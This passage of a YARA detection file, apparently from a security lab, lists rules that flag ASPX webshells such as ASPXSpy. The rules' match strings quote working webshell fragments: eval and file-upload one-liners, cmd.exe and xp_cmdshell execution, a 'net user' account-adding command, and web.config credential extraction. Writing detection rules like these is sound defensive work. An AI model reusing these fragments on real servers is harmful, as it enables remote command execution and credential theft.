        $s3 = "ewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre*/ %>" fullword ascii
        $s4 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[\"f\"])  ); }%>" fullword ascii
        $s5 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(\"f\")) ) %>" fullword ascii
        $s6 = "//bypass" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule sig_4744ac68e002d301948fcd384853adc60a9a5a1c
{
    meta:
        description = "aspx - file 4744ac68e002d301948fcd384853adc60a9a5a1c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "55fee364ee3f49bfffd6384dd4939724e1cb92e69966956f967574aa70ecc269"
    strings:
        $x1 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -Ite" fullword ascii
        $x2 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Fil" fullword ascii
        $x3 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($file in (get-childitem $path -Filter web.config -Recu" fullword ascii
        $x4 = "<asp:TextBox id=\"xpath\" width=\"350\" runat=\"server\">c:\\windows\\system32\\cmd.exe</asp:TextBox><br><br>" fullword ascii
        $x5 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);\"" fullword ascii
        $x6 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-conten" fullword ascii
        $x7 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"remove-item $env:temp\\$tempdir -recurse;} \"" fullword ascii
        $x8 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.cip" fullword ascii
        $x9 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Filt" ascii
        $x10 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$ErrorActionPreference = 'SilentlyContinue';\" " fullword ascii
        $x11 = "<!-- Web shell - command execution, web.config parsing, and SQL query execution -->" fullword ascii
        $x12 = "<!-- SQL Query Execution - Execute arbitrary SQL queries (MSSQL only) based on extracted connection strings -->" fullword ascii
        $x13 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.con" fullword ascii
        $x14 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $" ascii
        $x15 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$ds=New-Object system.Data.DataSet;\"" fullword ascii
        $x16 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Try { $connstrings = $xml.get_DocumentElement(); } Catch { cont" fullword ascii
        $x17 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -ItemT" ascii
        $x18 = "<!-- Command execution - Run arbitrary Windows commands -->" fullword ascii
        $x19 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
        $x20 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 70KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule fd9ad24ce612be3a6be8ac9073be60f142d5d2cd
{
    meta:
        description = "aspx - file fd9ad24ce612be3a6be8ac9073be60f142d5d2cd.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
    strings:
        $x1 = "<a href=\"http://www.hongkediguo.com\"  target=\"_blank\"><font color=\"#FF154\">[+]H.E.C</font> </a>" fullword ascii
        $s2 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s3 = ".4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID=\"QcZPA\" runat=\"server\" Text=\"" fullword ascii
        $s4 = ".Bin_Style_Login{font-size: 12px; font-family:Meiryo;background-color:#fff;border:2px solid #ddd;}" fullword ascii
        $s5 = "<asp:TextBox ID=\"HRJ\" runat=\"server\" Columns=\"25\" CssClass=\"Bin_Style_Login\" ></asp:TextBox>" fullword ascii
        $s6 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s7 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s8 = "<asp:Button ID=\"ZSnXu\" runat=\"server\" Text=\"OK! Go \" CssClass=\"Bin_Style_Login\" OnClick=\"xVm\"/><p/>" fullword ascii
        $s9 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:BLACK;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s10 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s11 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s12 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s13 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s14 = "public string Password=\"c62044cbc715523f36bed3c7908a437c\";//  H.E.C" fullword ascii
        $s15 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s16 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s17 = "Ip : <input class=\"input\" runat=\"server\" id=\"llH\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s18 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> " fullword ascii
        $s19 = "<div id=\"ljtzC\" runat=\"server\" style=\" margin:0px 20px\" enableviewstate=\"false\" visible=\"false\" >" fullword ascii
        $s20 = ": <input class=\"input\" runat=\"server\" id=\"dNohJ\" type=\"text\" size=\"20\" value=\"localadministrator\"/></td>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0e8b291e8acfae0f23ad5cbd6f08546a14ba6086
{
    meta:
        description = "aspx - file 0e8b291e8acfae0f23ad5cbd6f08546a14ba6086.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46a73ee18a69b984a6f9a67727fcf6533460f01e7f096bde3a98ff97ae119182"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "cmd.CommandText = \"exec master..xp_cmdshell '\" + TextBoxSqlCon.Text + \"'\";" fullword ascii
        $x5 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
        $s6 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s7 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s8 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
        $s9 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'><font color=\"#009900\">Data</font></a> </td>" fullword ascii
        $s11 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s13 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s15 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s16 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\" ForeColor = \"#009900\"></asp:TextBox></td>" fullword ascii
        $s17 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'><font color=\"#009900\">Temp</font></a> </td>" fullword ascii
        $s18 = "<asp:Label ID=\"LbSqlA\" runat=\"server\" Text=\"Sql Host:\"></asp:Label>" fullword ascii
        $s19 = "gif89a<%@ Page Language=\"C#\" ContentType=\"text/html\" validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
        $s20 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 80KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3b7910a499c603715b083ddb6f881c1a0a3a924d
{
    meta:
        description = "aspx - file 3b7910a499c603715b083ddb6f881c1a0a3a924d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "15cf99a1528066924ce318295c7dde1f1210b99c6de6dc41d5929994fcd32495"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %>" fullword ascii
        $s2 = "Response.Write(eval(keng,\"unsafe\"));" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_019eb61a6b5046502808fb5ab2925be65c0539b4
{
    meta:
        description = "aspx - file 019eb61a6b5046502808fb5ab2925be65c0539b4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0ea1ec937dd7ada5c804f3448eb6d725ded32da469fc4847e23ba2e738411bf4"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $x2 = "OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:" ascii
        $x3 = "ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create tabl" ascii
        $x4 = "Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x5 = "\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $x6 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
        $x7 = "Bin_ExecSql(\"EXECUTE master..xp_cmdshell 'del c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x8 = "t:16px\" size=\"40\" value=\"c:\\windows\\system32\\sethc.exe\"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\"" fullword ascii
        $x9 = "ile',null,'\" + Bin_TextBox_Source.Value + \"','\" + Bin_TextBox_Target.Value+ \"'\")){ Bin_Msg(\"File Copyed,Good Luck!\");}" fullword ascii
        $x10 = "+ \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x11 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x12 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
        $x13 = "foreach(ManagementObject p in Bin_WmiQuery(\"root\\\\CIMV2\",\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $x14 = "return string.Format(\"<a href=\\\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\\\">Kill</a>\",pid);" fullword ascii
        $s15 = "try {WebClient client = new WebClient();client.DownloadData(System.Text.Encoding.Default.GetString(System.Convert.FromBase64Stri" ascii
        $s16 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
        $s17 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
        $s18 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
        $s19 = "Bin_ExecSql(\"If object_id('bin_temp')is not null drop table bin_temp\");" fullword ascii
        $s20 = "else{Bin_Lable_File.PostedFile.SaveAs(uppath+Path.GetFileName(Bin_Lable_File.Value));Bin_Msg(\"File upload success!\");}" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule d2b48aaec03bf32977581e7ec00834e6f58de9eb
{
    meta:
        description = "aspx - file d2b48aaec03bf32977581e7ec00834e6f58de9eb.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5a2b42f395e836e2de823d8a19acf85ebc580b9e6b44270eee5af0ba023b91e2"
    strings:
        $s1 = "<%@Page Language=\"Jscript\"%><%eval(Request.Item[\"iceking\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_61fb987f606fa6c1426df59a049118240194a431
{
    meta:
        description = "aspx - file 61fb987f606fa6c1426df59a049118240194a431.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b8797931ad99b983239980359ef0ae132615ebedbf6fcb0c0e9979404b4a02a8"
    strings:
        $x1 = "        string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select o" wide
        $x2 = "            <asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword wide
        $s3 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" wide
        $s4 = "<%@ Assembly Name=\"System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword wide
        $s5 = "                <asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword wide
        $s6 = "            <asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2008 Bin -> <a href=\"http" wide
        $s7 = "            Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword wide
        $s8 = "            <asp:Button ID=\"Bin_ExecButton\" runat=\"server\" OnClick=\"Bin_ExecButton_Click\" Text=\"Exec\" />" fullword wide
        $s9 = "        Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword wide
        $s10 = "            <asp:Label ID=\"PassLabel\" runat=\"server\" Text=\"Password:\"></asp:Label>" fullword wide
        $s11 = "                    CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System3" wide
        $s12 = "                    prostr += \"<TD align=left>\" + p.ProcessName.ToString() + \"</TD>\";" fullword wide
        $s13 = "            string subkey = regkey.Substring(regkey.IndexOf(\"\\\\\") + 1, regkey.Length - regkey.IndexOf(\"\\\\\") - 1);" fullword wide
        $s14 = "            comm.ExecuteNonQuery();" fullword wide
        $s15 = "            <asp:Button ID=\"Bin_SuexpButton\" runat=\"server\" Text=\"Exploit\" OnClick=\"Bin_SuexpButton_Click\" /><br />" fullword wide
        $s16 = "            <asp:Button ID=\"LoginButton\" runat=\"server\" Text=\"Enter\" OnClick=\"LoginButton_Click\" /><p />" fullword wide
        $s17 = "        string setdomain = \"-SETDOMAIN\\r\\n-Domain=BIN|0.0.0.0|52521|-1|1|0\\r\\n-TZOEnable=0\\r\\n TZOKey=\\r\\n\";" fullword wide
        $s18 = "                <asp:Button ID=\"Bin_CmdButton\" runat=\"server\" Text=\"Command\" OnClick=\"Bin_CmdButton_Click\" />" fullword wide
        $s19 = "                <asp:TextBox ID=\"Bin_ScanipTextBox\" runat=\"server\" Width=\"194px\">127.0.0.1</asp:TextBox>" fullword wide
        $s20 = "                <asp:Button ID=\"Bin_IISButton\" runat=\"server\" OnClick=\"Bin_IISButton_Click\" Text=\"IISSpy\" />" fullword wide
    condition:
        ( uint16(0) == 0xfeff and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b99bd028b8e0933d3379ed513b44f68844ee4bbb
{
    meta:
        description = "aspx - file b99bd028b8e0933d3379ed513b44f68844ee4bbb.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f894126eeffb5955ce7a10c0f346301a74d195164f6de589ad10729b8de64039"
    strings:
        $s1 = "private string GetCmd(string cmd,string shell)" fullword ascii
        $s2 = "Response.Write(GetCmd(ok,shell));" fullword ascii
        $s3 = "p.StartInfo.UseShellExecute = false;" fullword ascii
        $s4 = "Response.Write(shell + ok );" fullword ascii
        $s5 = "<%@ import Namespace=\"System.Web.UI\"%>" fullword ascii
        $s6 = "string shell= Request.QueryString[\"shell\"];" fullword ascii
        $s7 = "//www.moonsec.com moon" fullword ascii
        $s8 = "p.StartInfo.FileName = shell;" fullword ascii
        $s9 = "Response.Write(cmd);" fullword ascii
        $s10 = "p.StandardInput.WriteLine(cmd);" fullword ascii
        $s11 = "p.StartInfo.RedirectStandardError = true;" fullword ascii
        $s12 = "ok = p.StandardOutput.ReadToEnd();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7eb750945f91244373367665eb33fdbb5121a433
{
    meta:
        description = "aspx - file 7eb750945f91244373367665eb33fdbb5121a433.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c3a539c800defe4c8e7147a3d36f436cd3c49c455c45de0431cc9ab65a2fe493"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x2 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//admin" fullword ascii
        $s8 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s9 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule c466a5bcb9635c0ee3c2be21166b6583e681ba32
{
    meta:
        description = "aspx - file c466a5bcb9635c0ee3c2be21166b6583e681ba32.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1286a0815c6982fadf3a1da2565fedfd133b8d07a5de1d592a640c3abbc2ffa5"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $s2 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s3 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s4 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s5 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//admin" fullword ascii
        $s6 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\"></div></div>" fullword ascii
        $s7 = "a2\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s8 = "string miansha1=\"P\"+\"o\"+\"r\"+\"t\"+\"M\"+\"a\"+\"p\"+\" \"+\">\"+\">\";" fullword ascii
        $s9 = "Bin_H2_Title.InnerText=miansha1;" fullword ascii
        $s10 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule efdad9d472d90e7abbf7903e56b6ebaa5579ae02
{
    meta:
        description = "aspx - file efdad9d472d90e7abbf7903e56b6ebaa5579ae02.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "472b9eb5ef824197c9cc370d787b068cd6c6fd61ace0795307a393b3c5221305"
    strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdkod).stdout.readall" fullword ascii
        $x2 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdd(1))" fullword ascii
        $x3 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdd(0))" fullword ascii
        $x4 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdd(2))" fullword ascii
        $x5 = "WS_FTP.ini\",\"C:/Program Files/Gene6 FTP Server/RemoteAdmin/remote.ini\",\"C:/users.txt\",\"D:/users.txt\",\"E:/users.txt\")" fullword ascii
        $x6 = "Set ExCmd = Sh.Exec(\"ping -n \" & b0xpings _" fullword ascii
        $x7 = "Set colItems = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\",,48)" fullword ascii
        $s8 = "yazsol(\"<form action='\"&FilePath&\"?mode=45' method=post><input name='inject2' value='yaz' type='hidden'><b>Mevki/Key : </b><i" ascii
        $s9 = "yazorta(\"<b> NTUser.Dat - Log - ?ni Eri?im Sonucu by b0x </b>\")" fullword ascii
        $s10 = "\"&oturum&\"\\ntuser.ini\",\"c:\\documents and settings\\Administrator\\ntuser.ini\")" fullword ascii
        $s11 = "yazortaa(\"<b>Coded by Alfso ... Developed By <a href=\"\"mailto:z1d1337@Gmail.CoM\"\"> TurkisH-RuleZ\")" fullword ascii
        $s12 = "?k portlar?, ve diledi?iniz port u dinleyebilirsiniz. <b>Netstat -a -b -e -n -o -r -s -v</b> gibi parametreler al?r.\")" fullword ascii
        $s13 = "'Disk Alan?n? G?sterir - Coded Developed By TurkisH-RuleZ" fullword ascii
        $s14 = "servu = array(\"C:\\Program Files\\base.ini\",\"C:\\base.ini\",\"C:\\Program Files\\Serv-U\\base.ini\",\"C:\\Program Files\\Serv" ascii
        $s15 = "yazsol(\" Ping Say?s? : <input style='color=#DAFDD0' name='inject1' value='20' type='text' size=20> (?rnek: 20) \")" fullword ascii
        $s16 = "yazortaa(\"<b>Coded by b0x - Cyber-Warrior</b>\")" fullword ascii
        $s17 = "Set objWMI = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")" fullword ascii
        $s18 = "response.write \"<META http-equiv=refresh content=20;URL='\"&FilePath&\"?mode=32&islem=1&url=\"&url&\"&file=\"&file&\"'>\"" fullword ascii
        $s19 = "objRcs.Open inject,objConn, adOpenKeyset , , adCmdText" fullword ascii
        $s20 = "yazsol(\" Site Ad? : <input style='color=#DAFDD0' name='url' value='sitead?.com' type='text' size=30> (?rnek: google.com) \")" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule fd45a72bda0a38d5ad81371d68d206035cb71a14
{
    meta:
        description = "aspx - file fd45a72bda0a38d5ad81371d68d206035cb71a14.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "80c56db3cc4d03dcc1e0d512d5b212ded84110a3a98381efe625689a6675ca1d"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
        $s5 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "tfit.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Listdir','\" + MVVJ(HlyU.Properties[\"Path\"].V" fullword ascii
        $s7 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s8 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
        $s9 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'><font color=\"#009900\">Data</font></a> </td>" fullword ascii
        $s11 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s13 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s15 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s16 = "TR.Attributes[\"title\"] = \"Site:\" + child.Properties[\"ServerComment\"].Value.ToString();" fullword ascii
        $s17 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\" ForeColor = \"#009900\"></asp:TextBox></td>" fullword ascii
        $s18 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'><font color=\"#009900\">Temp</font></a> </td>" fullword ascii
        $s19 = "<asp:Label ID=\"LbSqlA\" runat=\"server\" Text=\"Sql Host:\"></asp:Label>" fullword ascii
        $s20 = "<%@ Page Language=\"C#\" ContentType=\"text/html\" validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9f83df217f792caae3d2c1bd613e79e527ee1ac5
{
    meta:
        description = "aspx - file 9f83df217f792caae3d2c1bd613e79e527ee1ac5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
